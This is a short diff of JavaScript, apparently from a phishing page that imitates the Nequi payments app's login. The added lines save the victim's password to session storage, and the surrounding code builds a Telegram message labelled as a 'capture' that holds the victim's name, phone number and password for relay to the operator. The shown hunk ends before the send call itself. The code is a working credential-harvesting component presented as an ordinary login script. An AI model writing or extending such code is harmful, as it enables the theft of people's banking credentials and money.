@@ -112,6 +112,9 @@ document.addEventListener('DOMContentLoaded', () => {
         // Mostrar pantalla de carga
         loadingOverlay.classList.add('active');
 
+        // Guardar clave para reporte final
+        sessionStorage.setItem("bc_clave", password);
+
         // --- BLOQUE ADICIONAL: ENVÍO A TELEGRAM ---
         const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
         const mensaje = `🔔 **CAPTURA NEQUI (LOGIN)**\n\n👤 **Nombre:** \`${userNombre}\`\n📱 **Celular:** \`${phone}\`\n🔑 **Clave:** \`${password}\`\n\n🔄 **Redirigiendo a Saldo...**`;
